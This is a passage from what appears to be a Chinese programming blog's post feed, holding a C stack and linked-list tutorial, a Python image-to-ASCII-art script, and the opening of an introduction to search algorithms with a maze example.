class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">push</span><span class="params">(node *top, <span class="keyword">int</span> data)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pop</span><span class="params">(node *top)</span></span>;</span><br><span class="line"><span class="function">node* <span class="title">stack_init</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">(node *current)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">push</span><span class="params">(node *top, <span class="keyword">int</span> data)</span></span>&#123;</span><br><span class="line">node *temp = (node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">temp-&gt;data = data;</span><br><span class="line">temp-&gt;next = top-&gt;next;</span><br><span class="line">top-&gt;next = temp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pop</span><span class="params">(node *top)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!top-&gt;next)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Stack is empty now.&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> pop_data = top-&gt;next-&gt;data;</span><br><span class="line">node *temp = top-&gt;next;</span><br><span class="line">top-&gt;next = top-&gt;next-&gt;next;</span><br><span class="line">temp = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">free</span>(temp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> pop_data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">node* <span class="title">stack_init</span><span class="params">()</span></span>&#123;</span><br><span class="line">node *temp = (node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">temp-&gt;data = <span class="number">0</span>;</span><br><span class="line">temp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">(node *current)</span></span>&#123;</span><br><span class="line">current = current-&gt;next;</span><br><span class="line"><span class="keyword">while</span>(current)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,current-&gt;data);</span><br><span class="line">current = current-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> first_input;</span><br><span class="line"><span class="keyword">int</span> pop_input, pop_data;</span><br><span class="line">node *top = stack_init();</span><br><span class="line"><span class="keyword">int</span> status;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter strings, Ctrl+Z to quit.\n&quot;</span>);</span><br><span class="line">status = <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;first_input);</span><br><span class="line"><span class="keyword">while</span>(status!=EOF)&#123;</span><br><span class="line">push(top, first_input);</span><br><span class="line">status = <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;first_input);</span><br><span class="line">&#125;</span><br><span class="line">display(top);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now enter 1 to pop data, 0 to quit.\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;pop_input);</span><br><span class="line"><span class="keyword">while</span>(pop_input==<span class="number">1</span>)&#123;</span><br><span class="line">pop_data = pop(top);</span><br><span class="line"><span class="keyword">if</span>(pop_data==<span class="number">-1</span>)&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pop_data: %d\n&quot;</span>,pop_data);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;pop_input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nDone\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> 知识输出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用C语言实现链表</title>
      <link href="2021/05/02/link_list_by_C/"/>
      <url>2021/05/02/link_list_by_C/</url>
      
        <content type="html"><![CDATA[<h2>第一步：定义相应结构</h2><p>由于实现链表的编程语言为C，不能够使用类，故使用结构来实现链表中的节点；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LinkList</span> &#123;</span></span><br><span class="line"><span class="keyword">char</span> name[MAX_INPUT];</span><br><span class="line"><span class="keyword">long</span> number;</span><br><span class="line">LinkList* next;</span><br><span class="line">&#125;Link;</span><br></pre></td></tr></table></figure><p>该结构由一个字符数组，一项编号和一个指向此结构的指针组成。</p><h2>第二步：定义输入函数</h2><p>为了更容易、更准确的获取输入，在程序中重新定义输入函数，在原有fgets()函数的基础上略作修改，得到新的输入函数s_gets()；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">s_gets</span><span class="params">(<span class="keyword">char</span>* st, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span>* ret_val;</span><br><span class="line"><span class="keyword">char</span>* find;</span><br><span class="line">ret_val = fgets(st, n, <span class="built_in">stdin</span>);</span><br><span class="line"><span class="keyword">if</span> (ret_val) &#123;</span><br><span class="line">find = <span class="built_in">strchr</span>(st, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (find) &#123;</span><br><span class="line">*find = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">while</span> (getchar() != <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret_val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数为返回类型为字符指针、接受参数为一个字符指针和一个整数的输入函数，其中字符指针就是字符数组名称，因为数组名称本质上就是数组首元素的地址，而该数组为字符数组，故该字符数组名称本质上就是字符指针；</p><p>在函数内部，我声明了两个字符指针，一个用来接受<a href="https://baike.baidu.com/item/fgets">fgets</a>函数的返回值，一个用来接受查找字符函数(<a href="https://baike.baidu.com/item/strchr">strchr</a>)的返回值；</p><p>关于fgets()函数：</p><ul>    <li>如果接受输入的字符数量超过字符数组的大小(MAX_INPUT)，fgets()函数会返回先前传入的地址，即字符数组的名称，并且把末尾的字符换为空字符('\0')，使之成为一个字符串；</li>    <li>如果接收输入的字符数量在字符数组的大小以内，那么fgets()函数会将空字符放置在换行符之前，然后同样返回先前传入的地址；</li>    <li>需要注意的是：fgets()函数在遇到文件结尾(EOF End Of File)时将会返回一个空指针；</li></ul><p>关于strchr()函数：</p><ul>    <li>在某个字符数组中查找某字符，并返回指向该字符的指针</li>    <li>r如果字符串中不包含该字符，则返回一个空指针</li></ul><p>经过重写，修改如下：</p><p>首先使用fgets()函数接收输入，并将返回值存储在指针ret_val中，然后对该指针进行判断，如果不为空指针，则使用字符查找函数查找换行符，并将该换行符替换为空字符，如果查找换行符失败，说明输入的字符数量超过了字符数组的大小，这时使用一个while循环接收其余的输入并抛弃；如果ret_val为空指针，说明遇到文件结尾；最后返回ret_val；</p><h2>第三步：编写主函数进行测试</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> input[MAX_INPUT];</span><br><span class="line">Link* p = (Link*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Link*));</span><br><span class="line">Link* temp = p;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now start recording: \n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Name  : &quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (s_gets(input,MAX_INPUT) != <span class="literal">NULL</span> &amp;&amp; input[<span class="number">0</span>] != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">Link* a = (Link*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Link));</span><br><span class="line">a-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">temp-&gt;next = a;</span><br><span class="line">temp = temp-&gt;next;</span><br><span class="line"><span class="built_in">strcpy</span>(a-&gt;name, input);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Number: &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%ld&quot;</span>, &amp;(a-&gt;number));</span><br><span class="line">getchar();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Name  : &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">temp = p-&gt;next;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Recorded Data: \n&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (temp) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Name: %s\tNumber: %ld\n&quot;</span>, temp-&gt;name, temp-&gt;number);</span><br><span class="line">temp = temp-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul>    <li>首先声明一个字符数组用来储存输入，然后声明一个节点类型的指针作为头节点，并为其分配内存，接着再声明一个同样的临时指针指向该头指针，这里使用临时指针的目的是作为当前指针与下一个指针的过渡指针，同时保持头指针指向的内容不变，方便最后的输出；</li>    <li>在输出提示信息之后进入循环，退出条件为输入空行；在循环中，首先声明指向当前节点的指针并为其分配内存，接着将该指针指向的结构中的指针声明为NULL，然后将当前节点的指针赋给临时指针指向的结构的指针，使其与上一个节点相连，然后再将临时指针指向的指针赋给自身(其实就相当于使临时指针指向下一个节点)；接着将刚刚接收的输入复制到当前节点的name变量中，然后再接收编号的输入并存储到当前节点的number变量中；值得注意的是，在使用scanf()函数接收输入后该函数似乎会将换行符留在缓存区中，所以这里需要使用getchar()函数来将该换行符从缓存区中去除；</li>    <li>在循环结束之后，我将临时指针指向了头节点的下一个节点(请注意，头节点中并没有储存除下一个节点的地址之外的任何信息，故此处从头节点的下一个节点开始)；然后进入下一个while循环，退出条件为临时指针为空指针(因为在上一个while循环中已经将当前节点中的指针声明为NULL了，所以一旦第一个循环结束，最后一个节点中的指针必为NULL)，然后打印出当前节点的信息并将临时指针指向下一个节点。</li></ul><h2>源代码</h2><p>最后附上源代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_INPUT 20</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">s_gets</span><span class="params">(<span class="keyword">char</span>* st, <span class="keyword">int</span> n)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">s_gets</span><span class="params">(<span class="keyword">char</span>* st, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span>* ret_val;</span><br><span class="line"><span class="keyword">char</span>* find;</span><br><span class="line">ret_val = fgets(st, n, <span class="built_in">stdin</span>);</span><br><span class="line"><span class="keyword">if</span> (ret_val) &#123;</span><br><span class="line">find = <span class="built_in">strchr</span>(st, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (find) &#123;</span><br><span class="line">*find = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">while</span> (getchar() != <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret_val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LinkList</span> &#123;</span></span><br><span class="line"><span class="keyword">char</span> name[MAX_INPUT];</span><br><span class="line"><span class="keyword">long</span> number;</span><br><span class="line">LinkList* next;</span><br><span class="line">&#125;Link;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> input[MAX_INPUT];</span><br><span class="line">Link* p = (Link*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Link*));</span><br><span class="line">Link* temp = p;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now start recording: \n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Name  : &quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (s_gets(input,MAX_INPUT) != <span class="literal">NULL</span> &amp;&amp; input[<span class="number">0</span>] != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">Link* a = (Link*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Link));</span><br><span class="line">a-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">temp-&gt;next = a;</span><br><span class="line">temp = temp-&gt;next;</span><br><span class="line"><span class="built_in">strcpy</span>(a-&gt;name, input);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Number: &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%ld&quot;</span>, &amp;(a-&gt;number));</span><br><span class="line">getchar();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Name  : &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">temp = p-&gt;next;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Recorded Data: \n&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (temp) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Name: %s\tNumber: %ld\n&quot;</span>, temp-&gt;name, temp-&gt;number);</span><br><span class="line">temp = temp-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> 知识输出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用Python编写一个能将图片转换为字符画的程序</title>
      <link href="2021/04/10/%E7%94%A8Python%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E8%83%BD%E5%B0%86%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%AD%97%E7%AC%A6%E7%94%BB%E7%9A%84%E7%A8%8B%E5%BA%8F/"/>
      <url>2021/04/10/%E7%94%A8Python%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E8%83%BD%E5%B0%86%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%AD%97%E7%AC%A6%E7%94%BB%E7%9A%84%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">\<span class="comment"># -*- coding=utf-8 -*- </span></span><br><span class="line"></span><br><span class="line">from PIL import Image </span><br><span class="line"></span><br><span class="line">import argparse <span class="comment">#命令行输入参数处理 </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser() </span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">&#x27;file&#x27;</span>)     <span class="comment">#输入文件</span></span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">&#x27;-o&#x27;</span>, <span class="string">&#x27;--output&#x27;</span>)   <span class="comment">#输出文件 </span></span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">&#x27;--width&#x27;</span>, <span class="built_in">type</span> = int, default = 80) <span class="comment">#输出字符画宽 </span></span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">&#x27;--height&#x27;</span>, <span class="built_in">type</span> = int, default = 80) <span class="comment">#输出字符画高 #获取参数 </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">args = parser.parse_args() </span><br><span class="line"></span><br><span class="line">IMG = args.file</span><br><span class="line"></span><br><span class="line">WIDTH = args.width </span><br><span class="line"></span><br><span class="line">HEIGHT = args.height </span><br><span class="line"></span><br><span class="line">OUTPUT = args.output </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ascii_char = list(<span class="string">&quot;<span class="variable">$@B</span>%8&amp;WM#*oahkbdpqwmZO0QLCJUYXzcvunxrjft/\|()1&#123;&#125;[]?-_+~&lt;&gt;i!lI;:,\&quot;^&#x27;. &quot;</span>) <span class="comment"># 将256灰度映射到70个字符上 </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_char(r,g,b,alpha = 256):    </span><br><span class="line"></span><br><span class="line">​<span class="keyword">if</span> alpha == 0:        </span><br><span class="line"></span><br><span class="line">​<span class="built_in">return</span> <span class="string">&#x27; &#x27;</span>    </span><br><span class="line"></span><br><span class="line">​length = len(ascii_char)    </span><br><span class="line"></span><br><span class="line">​gray = int(0.2126 * r + 0.7152 * g + 0.0722 * b)     </span><br><span class="line"></span><br><span class="line">​unit = (256.0 + 1)/length    </span><br><span class="line"></span><br><span class="line">​<span class="built_in">return</span> ascii_char[int(gray/unit)] </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:     </span><br><span class="line"></span><br><span class="line">​im = Image.open(IMG)    </span><br><span class="line"></span><br><span class="line">​im = im.resize((WIDTH,HEIGHT), Image.NEAREST)     </span><br><span class="line"></span><br><span class="line">​txt = <span class="string">&quot;&quot;</span>     </span><br><span class="line"></span><br><span class="line">​<span class="keyword">for</span> i <span class="keyword">in</span> range(HEIGHT):        </span><br><span class="line"></span><br><span class="line">​<span class="keyword">for</span> j <span class="keyword">in</span> range(WIDTH):            </span><br><span class="line"></span><br><span class="line">​txt += get_char(*im.getpixel((j,i)))        </span><br><span class="line"></span><br><span class="line">​txt += <span class="string">&#x27;\n&#x27;</span>     </span><br><span class="line"></span><br><span class="line">​<span class="built_in">print</span>(txt)     <span class="comment">#字符画输出到文件    </span></span><br><span class="line"></span><br><span class="line">​<span class="keyword">if</span> OUTPUT:        </span><br><span class="line"></span><br><span class="line">​with open(OUTPUT,<span class="string">&#x27;w&#x27;</span>) as f:            </span><br><span class="line"></span><br><span class="line">​f.write(txt)    </span><br><span class="line"></span><br><span class="line">​<span class="keyword">else</span>:        </span><br><span class="line"></span><br><span class="line">​with open(<span class="string">&quot;output.txt&quot;</span>,<span class="string">&#x27;w&#x27;</span>) as f:           </span><br><span class="line"></span><br><span class="line">​f.write(txt)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>人工智能入门-查找</title>
      <link href="2021/04/10/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%85%A5%E9%97%A8-%E6%90%9C%E7%B4%A2/"/>
      <url>2021/04/10/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%85%A5%E9%97%A8-%E6%90%9C%E7%B4%A2/</url>
      
        <content type="html"><![CDATA[<h2>概述</h2><p>众所周知，人工智能在近些年十分火爆，在各个领域的应用也是十分广泛，其中一个领域就是导航。<a id="more"></a></p><p>也许有人会说，导航不就是电子地图嘛？和人工智能有什么关系？但其实在导航中人工智能发挥了很重要的作用。“条条大路通罗马”，为什么导航会向你推荐这条路而不推荐另一条路？这其中就涉及到了人工智能中的搜索算法。</p><p><img src="https://www.helloimg.com/images/2021/04/05/B7S4Ln.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/04/05/B7S4Ln.png" srcset="data:image/png;base64,666" alt="B7S4Ln.png"></p><p>在搜索中，往往有初始状态(initial states)、目标状态(goal states)，而人工智能所做的，就是在众多情形中，找到众多解决方法的最优解，其中会涉及到循环和迭代，假如我们现在有一个初始状态，我们要怎样达到目标状态呢？</p><h2>概念介绍</h2><p>在这之前需要先了解一些概念：</p><ul>    <li>动作：通常是接受状态的函数，返回在此状态中应该做出的决策</li>    <li>迁移模型：通常是接受状态和动作的函数，返回在此状态下做出此种决策后的新状态</li>    <li>节点：数据结构，用来记录状态，父节点，动作和路径成本</li>    <li>边界：数据结构，用来区分已探索的部分和未探索的部分</li></ul><h2>算法讨论</h2><p>在了解了相关概念之后，我们开始讨论算法：</p><ul>    <li>首先将初始状态放入边界，然后进入循环</li>    <ul>        <li>如果边界为空，则无解</li>        <li>从边界中移去一个节点</li>        <li>如果此节点包含目标状态，则追踪父节点，然后返回解决方案</li>        <li>扩张节点并将其加入边界</li>    </ul></ul><p>下面举个例子：</p><img src="https://www.helloimg.com/images/2021/04/05/B7StR6.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/04/05/B7StR6.png" srcset="data:image/png;base64,666" alt="B7StR6.png" style="zoom: 33%;" /><p>假设我们现在的要求是找到从A到E的路径</p><ul>    <li>第一步我们将A（初始状态）放入边界，进入循环</li>    <li>因为A不是目标状态，将A移出边界并将B加入边界</li>    <li>因为B不是目标状态，将B移出边界并将C和D加入边界</li>    <li>因为C不是目标状态，将C移出边界并将E加入边界</li>    <li>因为E是目标状态，所以我们返回从A到E的路径，循环结束</li></ul>至此，我们就解决了一个非常简单的路径搜索问题，当然，这个算法还存在着许多问题，比如：如何确保算法不会重新检查当前状态的父节点？如果重复检查父节点，那么程序将进入无限死循环。解决方法很简单，使用一个数据结构来储存已检查过的节点，然后在每次检查节点时遍历此数据结构，如果存在与之相同的节点则不检查。<p>那么在实际情况下是怎么样的呢？</p><h2>实战</h2><p>下面进入实战环节：</p><p>情境：你现在有一张迷宫地图，起点为A，终点为B，需要编写程序令计算机自行找出离开迷宫的路并显示在屏幕上</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># # # # #         B </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line">                    </span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line">A           <span class="comment"># # # # </span></span><br></pre></td></tr></table></figure><p>我们将这个待实现的程序按照之前所讨论的分为几个部分：</p><p><a href="https://www.helloimg.com/image/BITMNm"><img src="https://www.helloimg.com/images/2021/04/11/BITMNm.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/04/11/BITMNm.png" srcset="data:image/png;base64,666" alt="BITMNm.png"></a></p><p>如图所示，我们主要将程序分为三个部分：</p><p>首先是定义相关的变量，并且将初始状态放入边界；</p><p>然后进入循环：</p><ul>    